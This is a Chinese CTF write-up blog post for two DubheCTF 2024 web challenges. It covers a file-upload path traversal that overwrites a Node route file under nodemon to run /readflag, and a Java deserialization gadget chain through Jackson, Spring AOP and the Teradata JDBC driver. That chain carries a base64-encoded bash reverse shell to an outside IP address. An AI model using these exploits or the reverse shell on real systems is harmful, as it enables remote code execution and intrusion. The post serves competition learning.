<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>DubheCTF 2024 Web Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="DubheCTF 2024 Web Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2024/03/19/DubheCTF%202024%20Web%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-03-19T14:14:25.720Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>19,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">DubheCTF 2024 Web Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="Wecat"><a href="#Wecat" class="headerlink" title="Wecat"></a>Wecat</h1><p>考点：</p>
<ul>
<li>nodemon 热部署</li>
<li>文件上传覆盖</li>
<li>权限绕过</li>
</ul>
<p>一开始看这一题的代码感觉还挺难的，结果仔细一看发现非常之简单啊。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">JsonWebToken</span> = <span class="built_in">require</span>(<span class="string">&#x27;../module/jwt&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="keyword">new</span> <span class="title class_">JsonWebToken</span>()</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 验证token</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">verifyToken</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/(login|sign|static)/g</span>.<span class="title function_">test</span>(ctx.<span class="property">url</span>)) <span class="keyword">return</span> <span class="title function_">next</span>() <span class="comment">// 登录、注册、获取静态文件不需要验证权限</span></span><br><span class="line">    <span class="keyword">const</span> verify = <span class="keyword">await</span> jwt.<span class="title function_">tokenVerify</span>(ctx)</span><br><span class="line">    ctx.<span class="property">status</span> = <span class="number">200</span></span><br><span class="line">    <span class="keyword">if</span> (verify === <span class="number">401</span>) &#123; <span class="comment">// 验证不通过</span></span><br><span class="line">      ctx.<span class="property">body</span> = &#123;</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;身份认证已过期&#x27;</span>,</span><br><span class="line">        <span class="attr">error</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">type</span>: verify</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">next</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>开局我看到了个鉴权的模块，首先key也给你了，然后还加了个没用的if。然后我注意到了dockerfile一个启动文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710834908806-24f0cd15-7223-4554-bdce-284a5a1588ee.png#averageHue=%23232528&clientId=u51b156d6-971a-4&from=paste&height=969&id=u34a2bf94&originHeight=1938&originWidth=3362&originalType=binary&ratio=2&rotation=0&showTitle=false&size=503052&status=done&style=none&taskId=u548d7697-4b0b-4775-ac77-078934d56c7&title=&width=1681" alt="image.png"></p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:alpine</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> server .</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> readflag /readflag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 400 /flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +xs /readflag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> adduser -D player</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R player:player /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> player</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm i</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3800</span> <span class="number">4800</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;npm&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;dev&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p>结合上述2个文件可以知道，使用的是nodemon进行的热部署启动，这时候凭直觉就是文件覆盖了。并且不需要考虑权限问题，因为session本地可以制作。直接找点位就行了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710834989406-3f038bb3-bf18-413d-8639-d3a83a8d0ddd.png#averageHue=%231f2124&clientId=u51b156d6-971a-4&from=paste&height=399&id=ud8d50152&originHeight=798&originWidth=2306&originalType=binary&ratio=2&rotation=0&showTitle=false&size=201613&status=done&style=none&taskId=uec847c3d-4c59-4036-ba63-44f4be9220e&title=&width=1153" alt="image.png"><br>该api有字符串拼贴，可以任意文件读取。但其实没什么用，我们最后需要rce。找文件上传的点位<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710835173982-1f90b5f5-da0f-46c1-9fc6-b30b07a09ec5.png#averageHue=%23212326&clientId=u51b156d6-971a-4&from=paste&height=399&id=u75cd6778&originHeight=798&originWidth=2306&originalType=binary&ratio=2&rotation=0&showTitle=false&size=194379&status=done&style=none&taskId=u3fd70cf0-f0cb-4793-b2d0-fed22f8ff1d&title=&width=1153" alt="image.png"><br><code>/wechatAPI/upload/once</code><br>该处postfix可以拼贴，可以文件覆盖和上传。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wechatAPI/upload/once</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8088</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA4MzkwNzksImRhdGEiOiIxcGFzcyIsImlhdCI6MTcxMDgzNTQ3OX0.9I40cxAGdiKqjYbecTdKLuVxNOnJQA774LTP1YEHSYU</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;122&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>208</span><br><span class="line"></span><br><span class="line"><span class="language-moonscript"><span class="comment">--ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a</span></span></span><br><span class="line"><span class="language-moonscript">Content-<span class="name">Disposition</span>: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;getflag.js&quot;</span></span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript">const router = <span class="built_in">require</span>(<span class="string">&#x27;@koa/router&#x27;</span>)()</span></span><br><span class="line"><span class="language-moonscript">const child_process = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript">router.get(<span class="string">&#x27;/wechatAPI/getflag&#x27;</span>, <span class="function"><span class="params">(ctx)</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-moonscript">    var flag = child_process.execFileSync(<span class="string">&quot;/readflag&quot;</span>).toString()</span></span><br><span class="line"><span class="language-moonscript">    ctx.status = <span class="number">200</span></span></span><br><span class="line"><span class="language-moonscript">    ctx.body = &#123;</span></span><br><span class="line"><span class="language-moonscript">        <span class="name">msg</span>: flag</span></span><br><span class="line"><span class="language-moonscript">    &#125;</span></span><br><span class="line"><span class="language-moonscript">&#125;)</span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript"><span class="built_in">module</span>.exports = router.routes()</span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript"><span class="comment">--ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a</span></span></span><br><span class="line"><span class="language-moonscript">Content-<span class="name">Disposition</span>: form-data; name=<span class="string">&quot;name&quot;</span></span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript">getflag.js</span></span><br><span class="line"><span class="language-moonscript"><span class="comment">--ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a</span></span></span><br><span class="line"><span class="language-moonscript">Content-<span class="name">Disposition</span>: form-data; name=<span class="string">&quot;hash&quot;</span></span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript">/.</span></span><br><span class="line"><span class="language-moonscript"><span class="comment">--ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a</span></span></span><br><span class="line"><span class="language-moonscript">Content-<span class="name">Disposition</span>: form-data; name=<span class="string">&quot;postfix&quot;</span></span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript">/../src/route/getflag.js</span></span><br><span class="line"><span class="language-moonscript"><span class="comment">--ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a--</span></span></span><br><span class="line"><span class="language-moonscript"></span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710836167432-1344783e-9941-44be-8f8c-ab1aa2fa5b4d.png#averageHue=%23000000&clientId=u51b156d6-971a-4&from=paste&height=637&id=u4b0b511f&originHeight=1274&originWidth=2000&originalType=binary&ratio=2&rotation=0&showTitle=false&size=187331&status=done&style=none&taskId=ucb593c00-ac65-468e-8538-195f252a89b&title=&width=1000" alt="image.png"><br>可以看到getflag.js已经文件上传了，接下来我们需要去覆盖一下router.js<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710836266918-332b02de-0e33-46e6-bf98-907db25d63ac.png#averageHue=%23edeff3&clientId=u51b156d6-971a-4&from=paste&height=829&id=u35ac7f13&originHeight=1658&originWidth=2848&originalType=binary&ratio=2&rotation=0&showTitle=false&size=598849&status=done&style=none&taskId=udf7f6e0e-bc7b-44fa-a655-596bd1b6692&title=&width=1424" alt="image.png"><br>最后访问&#x2F;getflag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710836451619-ead0c851-4cb6-495f-8002-7611c3e3998d.png#averageHue=%23698284&clientId=u51b156d6-971a-4&from=paste&height=620&id=uaa5979eb&originHeight=1240&originWidth=2478&originalType=binary&ratio=2&rotation=0&showTitle=false&size=388564&status=done&style=none&taskId=ud8e6565d-5c19-4271-b7ac-ce42f37752d&title=&width=1239" alt="image.png"></p>
<h1 id="Javolution"><a href="#Javolution" class="headerlink" title="Javolution"></a>Javolution</h1><p>考点</p>
<ul>
<li>Jdk17</li>
<li>Tera Jdbc RCE</li>
<li>整形溢出</li>
</ul>
<p>漏洞路由出现在这里</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&#123;&quot;/cheat&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">cheatPlus</span><span class="params">(String host, String data)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">secretKey</span> <span class="operator">=</span> <span class="string">&quot;dubhe&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.palService.getPlayer().getLevel() &gt;= <span class="number">50</span> &amp;&amp; host != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> local;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InetAddress</span> <span class="variable">address</span> <span class="operator">=</span> InetAddress.getByName(host);</span><br><span class="line">                local = address.isLoopbackAddress();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Bad Host!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (local &amp;&amp; host.contains(secretKey)) &#123;</span><br><span class="line">                <span class="built_in">this</span>.palService.genPal(data);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;You are now invincible !&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Only localhost is allowed to cheat !&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You are too young to cheat !&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>最后会直接进行base64 反序列化<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710837446962-c88c7fdf-31bc-4c9f-897f-1365c0269f3b.png#averageHue=%23212326&clientId=u51b156d6-971a-4&from=paste&height=289&id=u18bc1280&originHeight=578&originWidth=2264&originalType=binary&ratio=2&rotation=0&showTitle=false&size=130944&status=done&style=none&taskId=u92d018b4-0c08-45ba-9f21-ba7d48f4ca2&title=&width=1132" alt="image.png"><br>直接先分析利用链如何构造。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710837477804-c5ed12ad-d52e-4df7-b703-8b0bdc381852.png#averageHue=%23303337&clientId=u51b156d6-971a-4&from=paste&height=836&id=uebe64506&originHeight=1672&originWidth=1308&originalType=binary&ratio=2&rotation=0&showTitle=false&size=321741&status=done&style=none&taskId=u5eb2bcff-b02c-4be6-8e02-bf07c7247c7&title=&width=654" alt="image.png"><br>jackson加上terajdbc依赖，rce应该看的就是tera了，科学上网一波<br><a target="_blank" rel="noopener" href="https://github.com/luelueking/Deserial_Sink_With_JDBC?tab=readme-ov-file">https://github.com/luelueking/Deserial_Sink_With_JDBC?tab&#x3D;readme-ov-file</a><br>这里有有关tera的利用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator&quot;</span>;</span><br><span class="line"><span class="type">TeraDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TeraDataSource</span>();</span><br><span class="line">dataSource.setBROWSER(command);</span><br><span class="line">dataSource.setLOGMECH(<span class="string">&quot;BROWSER&quot;</span>);</span><br><span class="line">dataSource.setDSName(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">dataSource.setDbsPort(<span class="string">&quot;10250&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>前半段就是getter触发getconenction<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710838037051-28efe1cb-f69c-409c-9d9a-f6f4fcff2073.png#averageHue=%23212225&clientId=u51b156d6-971a-4&from=paste&height=436&id=ubaaca9e9&originHeight=872&originWidth=2462&originalType=binary&ratio=2&rotation=0&showTitle=false&size=179552&status=done&style=none&taskId=uc0c8d2ae-73cc-4c4b-969a-c8124295f7c&title=&width=1231" alt="image.png"><br>我们需要进入下面的getconenction，所以getter放置的类应该是题目给的一个类叫做<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710838062734-bf05984c-aa70-4f79-b9e0-e895e7b1b5c7.png#averageHue=%23212225&clientId=u51b156d6-971a-4&from=paste&height=470&id=ucb215cb9&originHeight=940&originWidth=1808&originalType=binary&ratio=2&rotation=0&showTitle=false&size=187349&status=done&style=none&taskId=u569c11de-ba27-4f75-a688-ec306064ad1&title=&width=904" alt="image.png"><br>他也有getconnection。接下来让我们构造一下java17的jackson链，这里有个比较崭新的trick，我们可以通过java的option开启模块，反序列化并不会检验。。。我才知道，所以绕过什么module似乎没有意义了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.teradata.jdbc.TeraDataSource;</span><br><span class="line"><span class="keyword">import</span> com.teradata.jdbc.TeraDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> org.dubhe.javolution.pool.PalDataSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4yNC4xODgvNzc3NyA8JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//        String command = &quot;open -a Calculator&quot;;</span></span><br><span class="line">        <span class="type">TeraDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TeraDataSource</span>();</span><br><span class="line">        dataSource.setBROWSER(command);</span><br><span class="line">        dataSource.setLOGMECH(<span class="string">&quot;BROWSER&quot;</span>);</span><br><span class="line">        dataSource.setDSName(<span class="string">&quot;8.130.24.188&quot;</span>);</span><br><span class="line">        dataSource.setDbsPort(<span class="string">&quot;10250&quot;</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(dataSource);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;DataSource.class&#125;, handler);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;123&quot;</span>));</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jsonNodes);</span><br><span class="line">        <span class="comment">// 执行序列化与反序列化，并且返回序列化数据</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = SerializeUtils.makeMap(h1, h2);</span><br><span class="line">        System.out.println(SerializeUtils.base64serial(map));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
